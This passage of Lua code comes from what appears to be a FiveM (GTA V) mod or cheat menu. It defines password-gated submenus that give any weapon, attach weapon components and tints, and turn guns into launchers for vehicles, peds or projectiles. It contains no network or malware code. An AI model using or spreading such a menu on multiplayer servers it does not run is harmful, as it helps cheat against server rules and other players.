                    end)
                then
                elseif Plane.MenuButton("Weapon Customization", "WeaponCustomization") then
                elseif Plane.MenuButton("Bullet Gun Options", "BulletGunMenu") then
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("WeaponCustomization") then
                if Plane.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                        rainbowTint = enabled
                    end)
                then
                elseif Plane.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                    currentTint = currentIndex
                    selectedTint = selectedIndex

                    if selectedTint == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                    end
                    if selectedTint == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    end
                    if selectedTint == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    end
                    if selectedTint == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    end
                    if selectedTint == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    end
                    if selectedTint == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    end
                    if selectedTint == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    end
                    if selectedTint == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                end)
                then
                elseif Plane.Button("~g~Add Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif Plane.Button("~r~Remove Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif Plane.Button("~g~Add Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif Plane.Button("~r~Remove Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif Plane.Button("~g~Add Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif Plane.Button("~r~Remove Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end

                Plane.Display()
            elseif Plane.IsMenuOpened("BulletGunMenu") then
                if Plane.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                        vehicleGun = enabled
                    end)
                then
                elseif Plane.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif Plane.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                    currentVehicleSpeed = currentIndex
                    selectedVehicleSpeed = selectedIndex
                end)
                then
                elseif Plane.CheckBox(
                    "Ped Gun",
                    pedGun,
                    function(enabled)
                        pedGun = enabled
                end)
                then
                elseif Plane.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                    currentPed = currentIndex
                    selectedPed = selectedIndex
                end)
                then
                elseif Plane.CheckBox(
                    "Bullet Gun",
                    bulletGun,
                    function(enabled)
                        bulletGun = enabled
                    end)
                then
                elseif Plane.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                    currentBullet = currentIndex
                    selectedBullet = selectedIndex
                    end)
                then
                end




                Plane.Display()
            elseif Plane.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if Plane.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                end



                Plane.Display()
            elseif IsDisabledControlPressed(0, 162) then
                if logged then
                    Plane.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Enter Password", "", 100)
                    if temp == pass then
                        drawNotification("~g~Login Succesful!")
                        logged = true
                        Plane.OpenMenu("MainMenu")
                    else
                        drawNotification("~r~Login has failed, wrong key brother")
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)
